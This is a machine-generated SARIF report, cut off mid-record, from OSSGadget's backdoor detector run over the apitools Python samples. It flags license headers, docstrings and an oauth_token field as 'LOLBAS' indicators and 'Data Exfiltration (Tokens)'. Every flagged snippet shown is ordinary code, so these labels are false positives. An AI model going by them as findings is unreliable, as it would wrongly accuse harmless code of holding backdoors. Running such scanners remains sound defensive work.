{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_client_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 374,
                  "startColumn": 42,
                  "endLine": 374,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your\n      pagination token.  In this way you can retrieve the complete contents of\n      even very large collections one page at a time. However, if the contents\n      of the collection change between the first and last paginated list\n      request, the set of all elements returned will be an inconsistent view\n      of the collection. There is no way to retrieve a consistent snapshot of\n",
                    "rendered": {
                      "text": "      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your\n      pagination token.  In this way you can retrieve the complete contents of\n      even very large collections one page at a time. However, if the contents\n      of the collection change between the first and last paginated list\n      request, the set of all elements returned will be an inconsistent view\n      of the collection. There is no way to retrieve a consistent snapshot of\n",
                      "markdown": "`      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your\n      pagination token.  In this way you can retrieve the complete contents of\n      even very large collections one page at a time. However, if the contents\n      of the collection change between the first and last paginated list\n      request, the set of all elements returned will be an inconsistent view\n      of the collection. There is no way to retrieve a consistent snapshot of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 284,
                  "startColumn": 32,
                  "endLine": 284,
                  "endColumn": 36,
                  "snippet": {
                    "text": "      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your page\n      token.  In this way you can retrieve the complete contents of even very\n      large collections one page at a time. However, if the contents of the\n      collection change between the first and last paginated list request, the\n      set of all elements returned will be an inconsistent view of the\n      collection. There is no way to retrieve a consistent snapshot of a\n",
                    "rendered": {
                      "text": "      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your page\n      token.  In this way you can retrieve the complete contents of even very\n      large collections one page at a time. However, if the contents of the\n      collection change between the first and last paginated list request, the\n      set of all elements returned will be an inconsistent view of the\n      collection. There is no way to retrieve a consistent snapshot of a\n",
                      "markdown": "`      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your page\n      token.  In this way you can retrieve the complete contents of even very\n      large collections one page at a time. However, if the contents of the\n      collection change between the first and last paginated list request, the\n      set of all elements returned will be an inconsistent view of the\n      collection. There is no way to retrieve a consistent snapshot of a\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 245,
                  "startColumn": 36,
                  "endLine": 245,
                  "endColumn": 40,
                  "snippet": {
                    "text": "  Fields:\n    creationTime: The time that this resource was created on the server. This\n      is in RFC3339 text format. Output only.\n    description: A mutable string of at most 1024 characters associated with\n      this resource for the user's convenience. Has no effect on the managed\n      zone's function.\n    dnsName: The DNS name of this managed zone, for instance \"example.com.\".\n",
                    "rendered": {
                      "text": "  Fields:\n    creationTime: The time that this resource was created on the server. This\n      is in RFC3339 text format. Output only.\n    description: A mutable string of at most 1024 characters associated with\n      this resource for the user's convenience. Has no effect on the managed\n      zone's function.\n    dnsName: The DNS name of this managed zone, for instance \"example.com.\".\n",
                      "markdown": "`  Fields:\n    creationTime: The time that this resource was created on the server. This\n      is in RFC3339 text format. Output only.\n    description: A mutable string of at most 1024 characters associated with\n      this resource for the user's convenience. Has no effect on the managed\n      zone's function.\n    dnsName: The DNS name of this managed zone, for instance \"example.com.\".\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 42,
                  "endLine": 64,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your\n      pagination token.  In this way you can retrieve the complete contents of\n      even very large collections one page at a time. However, if the contents\n      of the collection change between the first and last paginated list\n      request, the set of all elements returned will be an inconsistent view\n      of the collection. There is no way to retrieve a \"snapshot\" of\n",
                    "rendered": {
                      "text": "      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your\n      pagination token.  In this way you can retrieve the complete contents of\n      even very large collections one page at a time. However, if the contents\n      of the collection change between the first and last paginated list\n      request, the set of all elements returned will be an inconsistent view\n      of the collection. There is no way to retrieve a \"snapshot\" of\n",
                      "markdown": "`      results following your last page of results in pagination order. To\n      fetch them, make another list request using this value as your\n      pagination token.  In this way you can retrieve the complete contents of\n      even very large collections one page at a time. However, if the contents\n      of the collection change between the first and last paginated list\n      request, the set of all elements returned will be an inconsistent view\n      of the collection. There is no way to retrieve a \"snapshot\" of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 15,
                  "endLine": 17,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n\nclass Change(_messages.Message):\n  r\"\"\"An atomic update to a collection of ResourceRecordSets.\n\n  Enums:\n    StatusValueValuesEnum: Status of the operation (output only).\n",
                    "rendered": {
                      "text": "\n\nclass Change(_messages.Message):\n  r\"\"\"An atomic update to a collection of ResourceRecordSets.\n\n  Enums:\n    StatusValueValuesEnum: Status of the operation (output only).\n",
                      "markdown": "`\n\nclass Change(_messages.Message):\n  r\"\"\"An atomic update to a collection of ResourceRecordSets.\n\n  Enums:\n    StatusValueValuesEnum: Status of the operation (output only).\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 406,
                  "startColumn": 11,
                  "endLine": 406,
                  "endColumn": 15,
                  "snippet": {
                    "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                      "markdown": "`      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 42,
                  "endLine": 297,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n\nclass Project(_messages.Message):\n  r\"\"\"A project resource. The project is a top level container for resources\n  including Cloud DNS ManagedZones. Projects can be created only in the APIs\n  console.\n\n",
                    "rendered": {
                      "text": "\n\nclass Project(_messages.Message):\n  r\"\"\"A project resource. The project is a top level container for resources\n  including Cloud DNS ManagedZones. Projects can be created only in the APIs\n  console.\n\n",
                      "markdown": "`\n\nclass Project(_messages.Message):\n  r\"\"\"A project resource. The project is a top level container for resources\n  including Cloud DNS ManagedZones. Projects can be created only in the APIs\n  console.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 243,
                  "startColumn": 21,
                  "endLine": 243,
                  "endColumn": 27,
                  "snippet": {
                    "text": "  hosted by the Cloud DNS service.\n\n  Fields:\n    creationTime: The time that this resource was created on the server. This\n      is in RFC3339 text format. Output only.\n    description: A mutable string of at most 1024 characters associated with\n      this resource for the user's convenience. Has no effect on the managed\n",
                    "rendered": {
                      "text": "  hosted by the Cloud DNS service.\n\n  Fields:\n    creationTime: The time that this resource was created on the server. This\n      is in RFC3339 text format. Output only.\n    description: A mutable string of at most 1024 characters associated with\n      this resource for the user's convenience. Has no effect on the managed\n",
                      "markdown": "`  hosted by the Cloud DNS service.\n\n  Fields:\n    creationTime: The time that this resource was created on the server. This\n      is in RFC3339 text format. Output only.\n    description: A mutable string of at most 1024 characters associated with\n      this resource for the user's convenience. Has no effect on the managed\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 18,
                  "endLine": 30,
                  "endColumn": 24,
                  "snippet": {
                    "text": "      only).\n    kind: Identifies what kind of resource this is. Value: the fixed string\n      \"dns#change\".\n    startTime: The time that this operation was started by the server. This is\n      in RFC3339 text format.\n    status: Status of the operation (output only).\n  \"\"\"\n",
                    "rendered": {
                      "text": "      only).\n    kind: Identifies what kind of resource this is. Value: the fixed string\n      \"dns#change\".\n    startTime: The time that this operation was started by the server. This is\n      in RFC3339 text format.\n    status: Status of the operation (output only).\n  \"\"\"\n",
                      "markdown": "`      only).\n    kind: Identifies what kind of resource this is. Value: the fixed string\n      \"dns#change\".\n    startTime: The time that this operation was started by the server. This is\n      in RFC3339 text format.\n    status: Status of the operation (output only).\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 421,
                  "startColumn": 3,
                  "endLine": 421,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                    "rendered": {
                      "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                      "markdown": "`  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_messages.py"
                },
                "region": {
                  "startLine": 399,
                  "startColumn": 5,
                  "endLine": 399,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                    "rendered": {
                      "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                      "markdown": "`    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_client.py"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 20,
                  "endLine": 58,
                  "endColumn": 28,
                  "snippet": {
                    "text": "          }\n\n    def Create(self, request, global_params=None):\n      r\"\"\"Atomically update the ResourceRecordSet collection.\n\n      Args:\n        request: (DnsChangesCreateRequest) input message\n",
                    "rendered": {
                      "text": "          }\n\n    def Create(self, request, global_params=None):\n      r\"\"\"Atomically update the ResourceRecordSet collection.\n\n      Args:\n        request: (DnsChangesCreateRequest) input message\n",
                      "markdown": "`          }\n\n    def Create(self, request, global_params=None):\n      r\"\"\"Atomically update the ResourceRecordSet collection.\n\n      Args:\n        request: (DnsChangesCreateRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1/dns_v1_client.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 33,
                  "endLine": 11,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\nclass DnsV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service dns version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/dns/v1/'\n",
                    "rendered": {
                      "text": "\n\nclass DnsV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service dns version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/dns/v1/'\n",
                      "markdown": "`\n\nclass DnsV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service dns version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/dns/v1/'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/fusiontables_sample/fusiontables_v1/fusiontables_v1_client.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 33,
                  "endLine": 11,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\nclass FusiontablesV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service fusiontables version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/fusiontables/v1/'\n",
                    "rendered": {
                      "text": "\n\nclass FusiontablesV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service fusiontables version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/fusiontables/v1/'\n",
                      "markdown": "`\n\nclass FusiontablesV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service fusiontables version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/fusiontables/v1/'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/fusiontables_sample/fusiontables_v1/fusiontables_v1_messages.py"
                },
                "region": {
                  "startLine": 684,
                  "startColumn": 11,
                  "endLine": 684,
                  "endColumn": 15,
                  "snippet": {
                    "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                      "markdown": "`      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/fusiontables_sample/fusiontables_v1/fusiontables_v1_messages.py"
                },
                "region": {
                  "startLine": 701,
                  "startColumn": 3,
                  "endLine": 701,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                    "rendered": {
                      "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                      "markdown": "`  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/fusiontables_sample/fusiontables_v1/fusiontables_v1_messages.py"
                },
                "region": {
                  "startLine": 677,
                  "startColumn": 5,
                  "endLine": 677,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                    "rendered": {
                      "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                      "markdown": "`    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/fusiontables_sample/fusiontables_v1.json"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 4,
                  "endLine": 49,
                  "endColumn": 14,
                  "snippet": {
                    "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                    "rendered": {
                      "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                      "markdown": "`   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/fusiontables_sample/__init__.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/uptodate_check_test.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
